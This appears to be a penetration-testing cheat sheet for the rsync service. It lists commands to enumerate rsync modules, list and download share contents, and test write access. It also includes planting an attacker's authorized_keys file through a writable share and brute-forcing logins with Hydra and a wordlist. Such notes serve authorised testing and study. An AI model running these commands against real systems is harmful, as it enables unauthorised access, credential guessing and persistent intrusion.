# Rsync
```table-of-contents
```
## Discovery & Enumeration
```shell
# Nmap - Discovery
nmap -sV -p 873 <IP>

# Netcat - Manual Probing (Banner Grabbing)
nc -nv <IP> 873
# (Type '@RSYNCD: 31.0' and then '#list' to see modules)
```
## Enumerating Shares
```shell
# List Shares (Anonymous)
rsync -av --list-only rsync://<IP>/

# List Specific Share Content
rsync -av --list-only rsync://<IP>/<SHARE_NAME>
```
## Downloading & Uploading
```shell
# Download a file
rsync -av rsync://<IP>/<SHARE_NAME>/file.txt .

# Upload a file (Test for Write Access)
touch test.txt
rsync -av test.txt rsync://<IP>/<SHARE_NAME>/test.txt

# Uploading SSH Key (If you can write to /home/user/.ssh/)
rsync -av authorized_keys rsync://<IP>/home_user/.ssh/
```
## Brute Force
```shell
# Hydra
hydra -l user -P rockyou.txt rsync://<IP>
```

## Post-Exploitation (Local)
```shell
# Configuration File (Check for 'read only = no')
cat /etc/rsyncd.conf
```